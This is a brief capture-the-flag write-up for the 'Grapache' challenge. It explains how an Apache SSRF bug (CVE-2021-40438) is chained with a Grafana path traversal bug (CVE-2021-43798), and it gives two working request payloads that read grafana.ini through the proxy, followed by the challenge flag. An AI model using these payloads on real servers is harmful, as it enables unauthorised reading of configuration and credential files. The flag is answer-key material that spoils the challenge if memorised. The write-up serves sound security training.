# Grapache

### Challenge Details

Outdated Grafana(vulnerable to CVE-2021-43798), but behind the Apache proxy, with path normalization, can't do direct exploitation. But Apache is vulnerable to CVE-2021-40438, which is an SSRF vuln, so can abuse that SSRF to request to the upstream grafana directly and achieve directory traversal and read files.

### Key Concepts

SSRF, Path traversal

### Solution

```
GET /?unix:{A*4096}|http://grafana:3000/public/plugins/welcome/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1

# The payload below also works, so you don't actually need to know the exact proxy configuration
GET /?unix:|http:///public/plugins/welcome/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
```

### Learning Objectives

same as Key Concepts

### Flag

```
grey{55rf_w17h_vuln_4p4ch3_847cc276557e198b}
```
